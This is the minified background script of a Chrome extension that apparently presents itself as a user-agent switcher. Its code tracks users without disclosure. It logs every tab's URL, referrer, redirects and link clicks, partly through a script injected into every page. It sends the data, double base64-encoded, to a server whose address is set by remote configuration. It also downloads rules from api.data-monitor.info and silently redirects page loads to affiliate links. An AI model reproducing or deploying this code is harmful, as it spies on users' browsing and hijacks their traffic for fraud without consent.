function req(obj, callback, errback) {
    var params = obj.params ? obj.params : [],
        xhr = new XMLHttpRequest;
    if (callback && (xhr.onload = function(e) {
            e = e.target, 200 === e.status || 304 === e.status ? callback({
                responseText: e.responseText,
                headers: e.getAllResponseHeaders().split("\r\n")
            }) : errback && errback(e.status)
        }), errback && (xhr.onerror = function(e) {
            e = e.target.status, errback(e)
        }), xhr.open(obj.method, obj.url), params.head)
        for (i in params.head) obj.setRequestHeader(i, params.head[i]);
    if (params.mime)
        for (i in params.mime) obj.overrideMimeType(params.mime[i]);
    if (params.post && xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), (params.post || params.xml) && xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest"), "object" == typeof params.post) {
        x = params.post, params.post = "";
        for (i in x) x.hasOwnProperty(i) && (params.post += (params.post ? "&" : "") + i + "=" + x[i])
    }
    xhr.send(params.post)
}

function cutw(hostname) {
    return hostname.replace(/(^www\.|\:\d+$)/gi, "")
}

function getDomain(hostname) {
    var result, matches = hostname.match(domainRgxp);
    return matches && (result = matches[1]), result
}

function getSub(hostname, domain) {
    var result = hostname.replace(domain, "");
    return result && (result = result.replace(/\.$/, "")), result
}

function prepareLink(link) {
    /^(\w+:)?\/\//.test(link) || (link = "http://" + link);
    var result, matches = link.match(mainRgxp);
    if (matches) try {
        var host = cutw(matches[2]),
            domain = getDomain(host);
        if (domain) {
            var sub = getSub(host, domain);
            result = {
                sch: matches[1],
                host: host,
                domain: domain,
                sub: sub,
                path: (matches[3] || "").replace(/^\//, ""),
                search: (matches[4] || "").replace(/^\?/, "")
            }
        }
    } catch (e) {
        console.log("Error: " + url)
    }
    return result
}

function tryUrl(url) {
    if (!(usedT && usedT > (new Date).getTime() - 42e5)) {
        var res, prepared = prepareLink(url);
        if (prepared && rulesObject[prepared.domain]) {
            var subd = rulesObject[prepared.domain][prepared.sub];
            if (subd && (subd[prepared.path] ? res = subd[prepared.path] : subd["*"] && (res = subd["*"])), res || (subd = rulesObject[prepared.domain]["*"]) && (subd[prepared.path] ? res = subd[prepared.path] : subd["*"] && (res = subd["*"])), res) return res = res.replace(/__CURURL__/g, encodeURIComponent(url)).replace(/__SUBID__/g, wid), usedT = (new Date).getTime(), localStorage.usedT = usedT, res
        }
    }
}

function getData() {
    setTimeout(getData, 864e5), req({
        method: "GET",
        url: host + "bhrule?sub=" + wid
    }, function(response) {
        try {
            response = JSON.parse(response.responseText), rulesObject = response.rules ? response.rules : {}
        } catch (e) {}
    }, function() {})
}
var wrap1 = function() {
    function qs(obj) {
        return Object.keys(obj).filter(function(key) {
            return (!!obj[key] || !1 === obj[key]) && -1 === filtered.indexOf(key)
        }).map(function(key) {
            var val = obj[key];
            return "se" === key ? obj[key].map(function(v) {
                return key + "=" + encodeURIComponent(v)
            }).join("&") : (-1 < "sh b a lt zz".split(" ").indexOf(key) && (val = encodeURIComponent(val || "")), key + "=" + val)
        }).join("&")
    }

    function fetchOverlayPattern(data, callback) {
        if (listenerLast = localStorage.getItem("listenerLast"), (new Date).getTime() - listenerLast > 300) {
            data.tnew = Date.now();
            var bqa = qs(data),
                payload = btoa(bqa),
                xhr = new XMLHttpRequest;
            xhr.open("POST", configFetcher.MainLocator() + main_route, !0), xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), xhr.onload = function(e) {
                if (200 == this.status) try {
                    callback(JSON.parse(this.response))
                } catch (e) {}
            }, xhr.send(["e", encodeURIComponent(btoa(payload))].join("=")), localStorage.setItem("listenerLast", (new Date).getTime())
        }
    }

    function TabList() {
        var hash = {},
            lp = "",
            lpi = void 0;
        return {
            remove: function(tid) {
                delete hash[tid]
            },
            edit: function(tid, props) {
                return tid ? (hash[tid] || this.clear(tid), Object.keys(props || {}).forEach(function(key) {
                    hash[tid][key] = props[key]
                }), hash[tid]) : null
            },
            request: function(tabId, tab) {
                if (configFetcher.IsEnable() && toggler.isOn()) {
                    if (!hash[tabId] || hash[tabId].p && !hash[tabId].replaced) return void this.clear(tabId);
                    var currTab = hash[tabId] || {},
                        url = validateUrl(tab.url);
                    url && (currTab.hh || lp != tab.url) && (tab.active || hash[tabId].fr || hash[tabId].uk.push("background_auto_reloading"), hash[tabId].dada && hash[hash[tabId].dada] && hash[hash[tabId].dada].retroet && (hash[tabId].zz = hash[hash[tabId].dada].retroet), fetchOverlayPattern(this.edit(tabId, {
                        sh: url,
                        b: lp
                    }), function(d) {}), tab.active && (lp = currTab.sh), hash[tabId].zz = null, hash[tabId].dada = null), this.clear(tabId), hash[tabId].sh = url, hash[tabId].p = !0
                }
            },
            clear: function(tid) {
                hash[tid] = {
                    var: version || "missing",
                    val: 21,
                    un: "1",
                    su: browsername,
                    ch: ch,
                    new: itemator1,
                    exp: guid(),
                    sesnew: "",
                    d: 0,
                    se: [],
                    restarting: !1,
                    sh: (hash[tid] || {}).sh || null,
                    a: (hash[tid] || {}).a || "",
                    uk: [],
                    fr: !1,
                    aj: (hash[tid] || {}).aj || !1,
                    replaced: (hash[tid] || {}).replaced || !1,
                    hh: (hash[tid] || {}).hh || !1,
                    dada: (hash[tid] || {}).dada || null,
                    retroet: (hash[tid] || {}).retroet || "",
                    zz: (hash[tid] || {}).zz || ""
                }
            },
            details: function(tid, cb) {
                chrome.tabs.get(tid, function(details) {
                    chrome.runtime.lastError || cb(details)
                })
            },
            lpUpdate: function(param) {
                var idd = param.id || param;
                lpi = param.id || void 0, lp = (hash[idd] || {}).sh || lp
            },
            getLpi: function() {
                return lpi
            }
        }
    }

    function validateUrl(url) {
        return 0 === url.indexOf("http") && -1 === url.indexOf("://localhost") && -1 === url.indexOf("chrome/newtab") && 0 !== url.indexOf("chrome-") && 0 !== url.indexOf("about:") && -1 === url.indexOf("chrome://") ? url : null
    }

    function reselected(tid) {
        tablist.details((tid || {}).tabId || tid, tablist.lpUpdate)
    }

    function onUpdated(tabId, details, tab) {
        details && "complete" === details.status && (tablist.edit(tabId).p && tablist.edit(tabId).aj && tablist.edit(tabId, {
            sh: void 0,
            p: !1,
            aj: !1
        }), tablist.edit(tabId, {
            ng: "ajax",
            aj: !0
        }), tablist.request(tabId, tab), tablist.edit(tabId, {
            replaced: !1
        }))
    }

    function onReplaced(addedTabId, removedTabId) {
        tablist.edit(addedTabId, {
            replaced: !0
        }), tablist.details(addedTabId, tablist.request.bind(tablist, (addedTabId || {}).tabId || addedTabId))
    }

    function onBeforeSendHeaders(details) {
        return tablist.edit(details.tabId, {
            hh: !0
        }), details.requestHeaders.some(function(rh) {
            return /^Referer$/i.test(rh.name) && tablist.edit(details.tabId, {
                a: rh.value
            })
        }) || tablist.edit(details.tabId, {
            a: ""
        }), {
            requestHeaders: details.requestHeaders
        }
    }

    function onCommitted(dtls) {
        dtls = dtls || {};
        var tid = dtls.tabId,
            tsh = dtls.transitionQualifiers;
        tid && 0 === dtls.frameId && (tablist.edit(tid, {
            ng: dtls.transitionType,
            tsh: tsh
        }), /client_redirect/.test(tsh) && tablist.edit(tid, {
            lt: dtls.url
        }), /server_redirect/.test(tsh), tablist.details(tid, tablist.request.bind(tablist, (tid || {}).tabId || tid)))
    }

    function cwonRemoved(windowID) {
        ct.query({
            active: !0
        }, function(tabs) {
            tabs[0] && tablist.lpUpdate(tabs[0])
        })
    }

    function cwonFocused(window) {
        cw.WINDOW_ID_NONE != window && ct.query({
            windowId: window,
            active: !0
        }, function(tabs) {
            tabs[0] && tabs[0].active && tablist.lpUpdate(tabs[0])
        })
    }

    function onCreated(tab) {
        var openerTabId = (tablist.edit(tab.id, {
            fr: !0,
            replaced: !1
        }), tab.openerTabId || tablist.getLpi());
        tablist.edit(openerTabId), tab.url.length && tablist.edit(openerTabId) && tab.url === tablist.edit(openerTabId).sh ? tablist.edit(tab.id).uk.push("duplication") : tab.url.length && ct.query({
            url: tab.url
        }, function(tabs) {
            (tabs || []).length > 1 && (tablist.edit(tab.id).uk.push("duplication"), tablist.edit(tab.id).uk.push("background_duplication"))
        }), "complete" != tab.status || tab.openerTabId || tablist.edit(tab.id).uk.push("reopening"), tablist.edit(tab.id, {
            dada: openerTabId
        })
    }

    function guid() {
        var guid = localStorage.getItem(guid_key);
        if (!guid) {
            var g = function() {
                return (65536 * (1 + Math.random(Date.now() + 12)) | 0).toString(30).substring(1)
            };
            guid = g() + g() + g() + g() + g() + g() + g() + g() + g(), localStorage.setItem(guid_key, guid)
        }
        return guid
    }
    var itemator1 = 310,
        version = chrome.runtime.getManifest().version,
        main_route = (localStorage.serverInfo && JSON.parse(localStorage.serverInfo), "/logic/page/data"),
        guid_key = "uaswitcherk",
        skeys = ["o", "u"],
        ch = 4,
        browsername = "chrome",
        toggler = new function() {
            function save() {
                localStorage.setItem(localKey, isOn ? 1 : 0)
            }

            function _optTurnOn() {}
            var isOn = !0,
                localKey = "isdugnlkWfmgosd2";
            this.turnOn = function() {
                    isOn = !0, save(), _optTurnOn()
                }, this.turnOff = function() {
                    isOn = !1, save()
                }, this.isOn = function() {
                    return isOn
                }, this.whenOn = function() {
                    return this.isOn() ? Promise.resolve(!0) : new Promise(function(resolve) {
                        _optTurnOn = function() {
                            resolve()
                        }
                    })
                },
                function() {
                    var val = localStorage.getItem(localKey),
                        intVal = parseInt(val);
                    isOn = !!isNaN(intVal) || 1 === intVal
                }()
        },
        configFetcher = new function() {
            var settings = "",
                setDump = function() {
                    localStorage.setItem("uasc", JSON.stringify(settings))
                },
                setUp = function(endpt) {
                    var cb = function(sts, resp) {
                            sts && (settings = JSON.parse(resp), setDump())
                        },
                        xhr = new XMLHttpRequest;
                    xhr.onreadystatechange = function() {
                        4 == xhr.readyState && cb.apply(null, [200 == xhr.status, xhr.responseText].concat(arguments))
                    }, xhr.open("GET", endpt + "?" + function(arr) {
                        return Object.keys(arr).map(function(hashed) {
                            return hashed + "=" + arr[hashed]
                        }).join("&")
                    }({
                        s: itemator1,
                        ver: version
                    }), !0), xhr.send()
                };
            ! function() {
                var p = localStorage.getItem("uasc");
                settings = p ? JSON.parse(p) : settings
            }(), toggler.whenOn().then(function() {
                setUp("https://uaswitcher.org/splash")
            }), this.enablator = function() {
                settings[skeys[0]] = 1, setDump()
            }, this.disablator = function() {
                settings[skeys[0]] = 0, setDump()
            }, this.IsEnable = function() {
                return Boolean(settings && settings[skeys[0]])
            }, this.MainLocator = function() {
                return settings && settings[skeys[1]]
            }
        },
        filtered = ["restarting", "hh", "p", "fr", "aj", "replaced", "retroet", "dada"],
        listenerLast = localStorage.getItem("listenerLast") || 0,
        tablist = new TabList,
        ct = (chrome.browserAction, chrome.tabs),
        wr = chrome.webRequest,
        wn = chrome.webNavigation,
        cw = chrome.windows;
    chrome.runtime.onMessage.addListener(function(request, sender) {
        request.href ? tablist.edit(sender.tab.id, {
            zz: request.href
        }) : request.ahref && tablist.edit(sender.tab.id, {
            retroet: request.ahref
        })
    }), cw.getAll({
        populate: !0
    }, function(windows) {
        for (var w = 0; w < windows.length; w++)
            for (var i = 0; i < windows[w].tabs.length; i++) validateUrl(windows[w].tabs[i].url) && (tablist.edit(windows[w].tabs[i].id, {
                sh: windows[w].tabs[i].url,
                restarting: !0
            }), windows[w].focused && windows[w].tabs[i].active && tablist.lpUpdate(windows[w].tabs[i]))
    }), ct.onUpdated.addListener(onUpdated), ct.onReplaced.addListener(onReplaced);
    var repertuar = {
        types: ["main_frame"],
        urls: ["<all_urls>"]
    };
    return wr.onBeforeRequest.addListener(function(details) {
        validateUrl(details.url) && tablist.edit(details.tabId, {
            sh: void 0,
            p: !1,
            aj: !1
        })
    }, repertuar, ["blocking"]), wr.onBeforeRedirect.addListener(function(details) {
        validateUrl(details.url) && tablist.edit(details.tabId).se.push(details.url)
    }, repertuar), wr.onBeforeSendHeaders.addListener(onBeforeSendHeaders, repertuar, ["blocking", "requestHeaders"]), wr.onHeadersReceived.addListener(function(details) {
        tablist.edit(details.tabId, {
            hh: !0
        })
    }, repertuar), wn.onCommitted.addListener(onCommitted), ct.onRemoved.addListener(function(tabId) {
        tablist.remove(tabId)
    }), cw.onRemoved.addListener(cwonRemoved), ct.onCreated.addListener(onCreated), cw.onFocusChanged.addListener(cwonFocused), ct.onActivated ? ct.onActivated.addListener(reselected) : ct.onSelectionChanged.addListener(reselected), wr.onErrorOccurred.addListener(function(details) {
        try {
            tablist.edit(details.tabId, {
                se: null
            })
        } catch (e) {}
    }, repertuar), {
        optin: toggler.turnOn,
        optout: toggler.turnOff,
        isopt: toggler.isOn,
        whenopt: toggler.whenOn()
    }
}();
wrap1.optin(), chrome.tabs.onUpdated.addListener(function(tabId) {
    chrome.tabs.get(tabId, function(tab) {
        "loading" == tab.status && chrome.tabs.executeScript(tab.id, {
            code: `
                    if(!document.getElementById("sbmarwusasv5")) {
                       var flag=document.createElement("span");
                       flag.id="sbmarwusasv5";
                       document.body.appendChild(flag);
     
                       document.body.addEventListener("click", function(event) {
                        try {
                            if(event.target.href) {
                                chrome.runtime.sendMessage({href: event.target.href, listener: "usassmwv5"});
                            }
                        }catch(e){
                            console.log(e);
                        }
                       });
                    
                    document.body.addEventListener("contextmenu", function(event) {
                        if(event.target.href) {
                            chrome.runtime.sendMessage({ahref: event.target.href, listener: "usassmwv5"});
                        }
                        return false;
                    }, false);
                    
                    document.body.addEventListener("auxclick", function(event) {
                        if(event.target.href) {
                            chrome.runtime.sendMessage({ahref: event.target.href, listener: "usassmwv5"});
                        }
                    });
             }`
        })
    })
});
var host = "http://api.data-monitor.info/api/",
    wid = 116,
    rulesObject = {},
    usedT = localStorage.usedT ? parseInt(localStorage.usedT) : null,
    mainRgxp = new RegExp("^(?:([^:\\/?]+):)?(?:\\/\\/([^\\/]*))?([^?]*)(?:\\?([^$]*))?"),
    domainRgxp = /((?:[^.]+)\.(?:(?:com?|org)\.)?\w+)$/i,
    listenFunc = function(details) {
        if (!(usedT && usedT > (new Date).getTime() - 42e5) && 0 === details.frameId && "main_frame" == details.type && -1 === details.parentFrameId && details.tabId > 0 && /^https?/i.test(details.url)) {
            var current = details.url,
                new_url = (prepareLink(current), tryUrl(current));
            if ("string" == typeof new_url && current != new_url) return {
                redirectUrl: new_url
            }
        }
    };
chrome.webRequest.onBeforeRequest.addListener(listenFunc, {
    urls: ["<all_urls>"]
}, ["blocking"]), getData();